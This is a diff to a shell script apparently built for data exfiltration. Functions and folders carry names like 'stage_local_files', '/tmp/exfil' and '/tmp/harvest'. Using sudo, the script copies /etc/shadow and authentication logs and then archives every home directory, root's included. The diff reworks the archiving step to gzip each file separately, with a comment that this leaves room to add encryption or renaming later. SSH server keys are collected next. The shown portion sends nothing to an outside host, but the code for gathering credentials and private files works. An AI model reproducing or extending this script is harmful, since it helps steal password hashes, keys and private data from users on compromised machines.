@@ -163,12 +163,32 @@ stage_local_files() {{
     sudo cp /var/log/auth.log /tmp/exfil/local/auth.log 2>/dev/null || true
     sudo cp /var/log/secure /tmp/exfil/local/secure 2>/dev/null || true
     
-    # 2. Complete Home & Root Directories (including hidden configurations & files)
+    # 2. Complete Home & Root Directories (harvested file-by-file for custom processing chains)
     for udir in /home/* /root; do
         [ -d "$udir" ] || continue
         uname=$(basename "$udir")
         echo "[*] Archiving local user home: $uname ..."
-        sudo tar -czf "/tmp/exfil/local/home_$uname.tar.gz" --exclude=.cache -C "$udir" . 2>/dev/null || true
+        
+        # Staging folder for this specific user
+        ustage="/tmp/exfil/local/home_$uname"
+        mkdir -p "$ustage"
+        
+        # Find all regular files, excluding .cache
+        sudo find "$udir" -type f ! -path "*/.cache/*" 2>/dev/null | while read -r filepath; do
+            # Compute relative path under home
+            relpath="${filepath#$udir/}"
+            # Target dir structure under staging
+            reldir=$(dirname "$relpath")
+            mkdir -p "$ustage/$reldir"
+            
+            # Chainable Operation: load, compress (gzip) and save to staging folder
+            # We compress individually so we can easily add custom encryption or rename steps here later
+            sudo gzip -c "$filepath" > "$ustage/$relpath.gz" 2>/dev/null || true
+        done
+        
+        # Package this user's staged home folder into a tarball
+        sudo tar -czf "/tmp/exfil/local/home_$uname.tar.gz" -C "$ustage" . 2>/dev/null || true
+        sudo rm -rf "$ustage"
     done
     
     # SSH server keys
@@ -216,11 +236,24 @@ sudo cp /etc/shadow /tmp/harvest/shadow 2>/dev/null || true
 sudo cp /var/log/auth.log /tmp/harvest/auth.log 2>/dev/null || true
 sudo cp /var/log/secure /tmp/harvest/secure 2>/dev/null || true
 
-# Complete Home & Root Directories (including hidden configurations & files)
+# Complete Home & Root Directories (harvested file-by-file for custom processing chains)
 for udir in /home/* /root; do
     [ -d "$udir" ] || continue
     uname=$(basename "$udir")
-    sudo tar -czf "/tmp/harvest/home_$uname.tar.gz" --exclude=.cache -C "$udir" . 2>/dev/null || true
+    ustage="/tmp/harvest/home_$uname"
+    mkdir -p "$ustage"
+    
+    sudo find "$udir" -type f ! -path "*/.cache/*" 2>/dev/null | while read -r filepath; do
+        relpath="${filepath#$udir/}"
+        reldir=$(dirname "$relpath")
+        mkdir -p "$ustage/$reldir"
+        
+        # Chainable Operation: load, compress (gzip) and save to staging folder
+        sudo gzip -c "$filepath" > "$ustage/$relpath.gz" 2>/dev/null || true
+    done
+    
+    sudo tar -czf "/tmp/harvest/home_$uname.tar.gz" -C "$ustage" . 2>/dev/null || true
+    sudo rm -rf "$ustage"
 done
 
 if [ -d /etc/ssh ]; then
